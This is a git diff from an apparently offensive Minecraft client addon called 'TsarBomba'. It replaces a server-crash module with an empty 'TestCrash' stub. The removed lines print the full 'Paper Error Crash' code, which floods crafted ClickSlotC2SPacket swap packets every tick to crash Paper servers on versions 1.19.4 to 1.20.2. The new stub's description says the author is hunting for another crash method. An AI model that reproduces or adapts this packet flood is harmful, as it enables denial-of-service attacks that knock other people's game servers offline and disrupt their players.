@@ -1,18 +1,13 @@
-package me.reich.tsarbomba.modules;
+package me.reich.tsarbomba.modules.crash;
 
-import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
 import me.reich.tsarbomba.TsarBomba;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
 import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
-import net.minecraft.item.ItemStack;
-import net.minecraft.item.Items;
-import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
-import net.minecraft.screen.slot.SlotActionType;
 
-public class ErrorCrash extends Module {
+public class TestCrash extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
     private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
@@ -28,28 +23,17 @@ public class ErrorCrash extends Module {
         .defaultValue(true)
         .build());
 
-    public ErrorCrash() {
-        super(TsarBomba.CATEGORY, "Paper Error Crash", "works on 1.19.4~1.20.2");
+    public TestCrash() {
+        super(TsarBomba.CATEGORY, "TestModule", "idk Im finding fucking crash module 😎");
+    }
+
+    @Override
+    public void onActivate(){
+
     }
 
     @EventHandler
     public void onTick(TickEvent.Pre tickEvent) {
-        var handler = mc.player.currentScreenHandler;
-        Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
-        itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
-        for (int i = 0; i < packets.get(); i++) {
-            mc.player.networkHandler.sendPacket(
-                new ClickSlotC2SPacket(
-                    handler.syncId,
-                    handler.getRevision(),
-                    36,
-                    -1,
-                    SlotActionType.SWAP,
-                    handler.getCursorStack().copy(),
-                    itemMap
-                )
-            );
-        }
 
     }
 
